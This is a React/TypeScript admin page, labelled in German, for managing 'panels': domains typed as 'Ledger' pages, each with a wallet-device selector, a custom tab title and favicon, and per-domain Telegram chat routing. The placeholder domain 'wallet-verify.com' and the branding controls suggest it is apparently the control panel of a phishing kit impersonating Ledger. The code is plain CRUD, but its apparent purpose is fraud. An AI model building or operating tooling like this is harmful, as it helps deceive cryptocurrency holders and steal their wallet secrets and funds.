import { useEffect, useRef, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import type { Tables } from "@/integrations/supabase/types";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Switch } from "@/components/ui/switch";
import { Badge } from "@/components/ui/badge";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from "@/components/ui/dialog";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { toast } from "sonner";
import { Copy, Pencil, Trash2, Plus, ExternalLink, Globe, Upload } from "lucide-react";
import PanelTypeEditor, { type PanelType } from "@/components/admin/PanelTypeEditor";

type Panel = Tables<"panels"> & { type: PanelType; domain: string | null };

const TYPE_OPTIONS: { value: PanelType; label: string }[] = [
  { value: "ledger", label: "Ledger" },
];

const TYPE_LABEL: Record<PanelType, string> = {
  ledger: "Ledger",
};

const DEVICE_OPTIONS = [
  { value: "all", label: "Auswahl anzeigen" },
  { value: "stax", label: "Ledger Stax" },
  { value: "flex", label: "Ledger Flex" },
  { value: "nano-gen5", label: "Ledger Nano Gen5" },
  { value: "nano-s", label: "Ledger Nano S" },
  { value: "nano-s-plus", label: "Ledger Nano S Plus" },
  { value: "nano-x", label: "Ledger Nano X" },
];

const NONE_VALUE = "__none__";
const DEFAULT_FAVICON = "/favicon.ico";

type EditForm = {
  id: string;
  title: string;
  device_type: string;
  favicon_url: string;
};

function normalizeDomain(input: string): string {
  return input.trim().toLowerCase().replace(/^https?:\/\//, "").replace(/^www\./, "").replace(/\/.*$/, "");
}

export default function Panels() {
  const [rows, setRows] = useState<Panel[]>([]);
  const [loading, setLoading] = useState(true);

  const [newDomain, setNewDomain] = useState("");
  const [newType, setNewType] = useState<PanelType>("ledger");
  const [newTelegramChatId, setNewTelegramChatId] = useState<string>(NONE_VALUE);
  const [adding, setAdding] = useState(false);

  const [telegramChats, setTelegramChats] = useState<
    { id: string; label: string; domains: string[] }[]
  >([]);
  const [typeFavicons, setTypeFavicons] = useState<Record<string, string | null>>({});

  const [editorType, setEditorType] = useState<PanelType | null>(null);
  const [editing, setEditing] = useState<EditForm | null>(null);
  const [savingEdit, setSavingEdit] = useState(false);
  const editFileRef = useRef<HTMLInputElement>(null);

  function readFaviconAsDataUrl(file: File, onDone: (url: string) => void) {
    if (file.size > 200 * 1024) {
      toast.error("Datei zu groß (max. 200 KB).");
      return;
    }
    const reader = new FileReader();
    reader.onload = () => {
      if (typeof reader.result === "string") onDone(reader.result);
    };
    reader.onerror = () => toast.error("Datei konnte nicht gelesen werden.");
    reader.readAsDataURL(file);
  }

  async function load() {
    setLoading(true);
    const { data, error } = await supabase
      .from("panels")
      .select("*")
      .order("created_at", { ascending: false });
    if (error) toast.error(error.message);
    else setRows((data ?? []) as Panel[]);
    setLoading(false);
  }

  async function loadTelegram() {
    const { data } = await supabase
      .from("telegram_chat_ids")
      .select("id, label, domains")
      .not("label", "is", null)
      .order("label", { ascending: true });
    setTelegramChats(
      (data ?? [])
        .filter((r) => r.label)
        .map((r) => ({
          id: r.id as string,
          label: r.label as string,
          domains: ((r.domains as string[] | null) ?? []) as string[],
        }))
    );
  }

  async function loadTypeFavicons() {
    const { data } = await supabase.from("panel_type_settings").select("type, favicon_url");
    const map: Record<string, string | null> = {};
    (data ?? []).forEach((r: any) => {
      if (r.type) map[r.type] = r.favicon_url ?? null;
    });
    setTypeFavicons(map);
  }

  useEffect(() => {
    load();
    loadTelegram();
    loadTypeFavicons();
  }, []);

  async function handleAdd() {
    const domain = normalizeDomain(newDomain);
    if (!domain) return;
    setAdding(true);
    const { error } = await supabase
      .from("panels")
      .insert({ domain, type: newType, slug: domain, active: true });
    if (error) {
      setAdding(false);
      toast.error(error.message);
      return;
    }
    if (newTelegramChatId !== NONE_VALUE) {
      const chat = telegramChats.find((c) => c.id === newTelegramChatId);
      if (chat && !chat.domains.includes(domain)) {
        const { error: tgErr } = await supabase
          .from("telegram_chat_ids")
          .update({ domains: [...chat.domains, domain] })
          .eq("id", chat.id);
        if (tgErr) toast.error(`Telegram-Update fehlgeschlagen: ${tgErr.message}`);
      }
    }
    setAdding(false);
    setNewDomain("");
    setNewTelegramChatId(NONE_VALUE);
    toast.success(`Panel "${domain}" hinzugefügt`);
    load();
    loadTelegram();
  }

  async function remove(p: Panel) {
    if (!confirm(`Panel "${p.domain ?? p.slug}" wirklich löschen?`)) return;
    const { error } = await supabase.from("panels").delete().eq("id", p.id);
    if (error) toast.error(error.message);
    else {
      toast.success("Gelöscht");
      setRows((cur) => cur.filter((r) => r.id !== p.id));
    }
  }

  async function toggleActive(p: Panel, active: boolean) {
    const { error } = await supabase.from("panels").update({ active }).eq("id", p.id);
    if (error) toast.error(error.message);
    else setRows((cur) => cur.map((r) => (r.id === p.id ? { ...r, active } : r)));
  }

  function copyLink(p: Panel) {
    const url = p.domain
      ? `https://${p.domain}`
      : `${window.location.origin}/${p.slug ?? ""}`;
    navigator.clipboard.writeText(url);
    toast.success("Link kopiert");
  }

  function openEdit(p: Panel) {
    setEditing({
      id: p.id,
      title: p.title ?? "",
      device_type: p.device_type ?? "all",
      favicon_url: p.favicon_url ?? "",
    });
  }

  async function saveEdit() {
    if (!editing) return;
    setSavingEdit(true);
    const { error } = await supabase
      .from("panels")
      .update({
        title: editing.title.trim() || null,
        device_type: editing.device_type,
        favicon_url: editing.favicon_url.trim() || null,
      })
      .eq("id", editing.id);
    setSavingEdit(false);
    if (error) return toast.error(error.message);
    toast.success("Panel aktualisiert");
    setEditing(null);
    load();
  }

  return (
    <div className="p-6 max-w-5xl mx-auto space-y-6">
      <div className="flex items-center gap-3">
        <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10 text-primary">
          <Globe className="h-5 w-5" />
        </div>
        <div>
          <h1 className="text-2xl font-semibold">Panels</h1>
          <p className="text-sm text-muted-foreground">
            Verwalten Sie Domains, deren Panel-Typ und das Favicon je Typ.
          </p>
        </div>
      </div>

      {/* Add */}
      <Card className="p-5">
        <h2 className="mb-4 text-sm font-semibold">Neues Panel hinzufügen</h2>
        <div className="flex flex-col gap-3 md:flex-row md:items-end">
          <div className="flex-1">
            <Label className="text-xs">Domain</Label>
            <Input
              placeholder="z. B. wallet-verify.com"
              value={newDomain}
              onChange={(e) => setNewDomain(e.target.value)}
            />
          </div>
          <div className="w-full md:w-56">
            <Label className="text-xs">Typ</Label>
            <Select value={newType} onValueChange={(v) => setNewType(v as PanelType)}>
              <SelectTrigger>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                {TYPE_OPTIONS.map((t) => (
                  <SelectItem key={t.value} value={t.value}>
                    {t.label}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>
          <div className="w-full md:w-56">
            <Label className="text-xs">Telegram-Label (optional)</Label>
            <Select value={newTelegramChatId} onValueChange={setNewTelegramChatId}>
              <SelectTrigger>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value={NONE_VALUE}>– keines –</SelectItem>
                {telegramChats.map((c) => (
                  <SelectItem key={c.id} value={c.id}>
                    {c.label}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>
          <Button
            onClick={handleAdd}
            disabled={!normalizeDomain(newDomain) || adding}
            className="md:w-36"
          >
            <Plus className="w-4 h-4 mr-1" /> {adding ? "…" : "Hinzufügen"}
          </Button>
        </div>
      </Card>

      {/* Types / Favicons */}
      <Card className="p-5">
        <h2 className="mb-4 text-sm font-semibold">Panel-Typen / Favicons</h2>
        <div className="grid grid-cols-2 gap-3 md:grid-cols-4">
          {TYPE_OPTIONS.map((t) => {
            const fav = typeFavicons[t.value];
            return (
              <div
                key={t.value}
                className="flex flex-col items-center gap-2 rounded-lg border bg-muted/30 p-4 text-center"
              >
                <img
                  src={fav ?? DEFAULT_FAVICON}
                  alt=""
                  className="h-10 w-10 rounded border bg-background object-contain"
                />
                <div className="text-sm font-medium">{t.label}</div>
                <div className="text-[11px] text-muted-foreground">
                  {fav ? "Eigenes Favicon" : "Standard-Favicon"}
                </div>
                <Button
                  size="sm"
                  variant="outline"
                  className="mt-1"
                  onClick={() => setEditorType(t.value)}
                >
                  <Pencil className="mr-1 h-3.5 w-3.5" />
                  Bearbeiten
                </Button>
              </div>
            );
          })}
        </div>
      </Card>

      {/* List */}
      <Card className="overflow-hidden">
        <table className="w-full text-sm">
          <thead className="bg-muted/50">
            <tr className="text-left">
              <th className="p-3">Domain</th>
              <th className="p-3">Typ</th>
              
              <th className="p-3">Aktiv</th>
              <th className="p-3">Erstellt</th>
              <th className="p-3 text-right">Aktionen</th>
            </tr>
          </thead>
          <tbody>
            {loading && (
              <tr>
                <td colSpan={5} className="p-8 text-center text-muted-foreground">
                  Laden…
                </td>
              </tr>
            )}
            {!loading && rows.length === 0 && (
              <tr>
                <td colSpan={5} className="p-8 text-center text-muted-foreground">
                  Noch keine Panels.
                </td>
              </tr>
            )}
            {rows.map((p) => (
              <tr key={p.id} className="border-t hover:bg-muted/30">
                <td className="p-3 font-medium">{p.domain ?? <span className="font-mono text-xs">/{p.slug}</span>}</td>
                <td className="p-3">
                  <Badge variant="secondary">{TYPE_LABEL[p.type] ?? p.type}</Badge>
                </td>
                <td className="p-3">
                  <Switch checked={p.active} onCheckedChange={(v) => toggleActive(p, v)} />
                </td>
                <td className="p-3 text-xs text-muted-foreground">
                  {new Date(p.created_at).toLocaleDateString()}
                </td>
                <td className="p-3">
                  <div className="flex gap-1 justify-end">
                    <Button size="icon" variant="ghost" onClick={() => copyLink(p)} title="Link kopieren">
                      <Copy className="w-4 h-4" />
                    </Button>
                    {p.domain && (
                      <Button size="icon" variant="ghost" asChild title="Öffnen">
                        <a href={`https://${p.domain}`} target="_blank" rel="noreferrer">
                          <ExternalLink className="w-4 h-4" />
                        </a>
                      </Button>
                    )}
                    <Button size="icon" variant="ghost" onClick={() => openEdit(p)} title="Bearbeiten">
                      <Pencil className="w-4 h-4" />
                    </Button>
                    <Button size="icon" variant="ghost" onClick={() => remove(p)} title="Löschen">
                      <Trash2 className="w-4 h-4 text-destructive" />
                    </Button>
                  </div>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </Card>

      {editorType && (
        <PanelTypeEditor
          open={!!editorType}
          onOpenChange={(o) => !o && setEditorType(null)}
          type={editorType}
          typeLabel={TYPE_LABEL[editorType]}
          onSaved={loadTypeFavicons}
        />
      )}

      <Dialog open={!!editing} onOpenChange={(o) => !o && setEditing(null)}>
        <DialogContent>
          <DialogHeader>
            <DialogTitle>Panel bearbeiten</DialogTitle>
          </DialogHeader>
          {editing && (
            <div className="space-y-4">
              <div>
                <Label>Title (Browser-Tab)</Label>
                <Input
                  value={editing.title}
                  onChange={(e) => setEditing({ ...editing, title: e.target.value })}
                />
              </div>
              <div>
                <Label>Gerät</Label>
                <Select
                  value={editing.device_type}
                  onValueChange={(v) => setEditing({ ...editing, device_type: v })}
                >
                  <SelectTrigger>
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    {DEVICE_OPTIONS.map((d) => (
                      <SelectItem key={d.value} value={d.value}>
                        {d.label}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              <div>
                <Label>Favicon (Override, optional)</Label>
                <div className="flex gap-2 mt-1">
                  <Input
                    value={editing.favicon_url}
                    onChange={(e) => setEditing({ ...editing, favicon_url: e.target.value })}
                    placeholder="Leer = Typ-Favicon verwenden"
                  />
                  <Button
                    type="button"
                    variant="outline"
                    onClick={() => editFileRef.current?.click()}
                  >
                    <Upload className="h-4 w-4 mr-1" /> Hochladen
                  </Button>
                  <input
                    ref={editFileRef}
                    type="file"
                    accept="image/png,image/x-icon,image/vnd.microsoft.icon,image/svg+xml,image/webp,image/jpeg"
                    className="hidden"
                    onChange={(e) => {
                      const f = e.target.files?.[0];
                      if (f) readFaviconAsDataUrl(f, (url) => setEditing((cur) => cur ? { ...cur, favicon_url: url } : cur));
                      e.target.value = "";
                    }}
                  />
                </div>
                {editing.favicon_url && (
                  <div className="flex items-center gap-3 rounded border p-2 mt-2 bg-muted/30">
                    <img src={editing.favicon_url} alt="" className="h-8 w-8 rounded border bg-background object-contain" />
                    <span className="text-xs text-muted-foreground">Vorschau</span>
                    <Button
                      type="button"
                      size="sm"
                      variant="ghost"
                      className="ml-auto"
                      onClick={() => setEditing({ ...editing, favicon_url: "" })}
                    >
                      Entfernen
                    </Button>
                  </div>
                )}
                <p className="text-xs text-muted-foreground mt-1">PNG/SVG/ICO, max. 200 KB.</p>
              </div>
            </div>
          )}
          <DialogFooter>
            <Button variant="ghost" onClick={() => setEditing(null)}>
              Abbrechen
            </Button>
            <Button onClick={saveEdit} disabled={savingEdit}>
              Speichern
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}
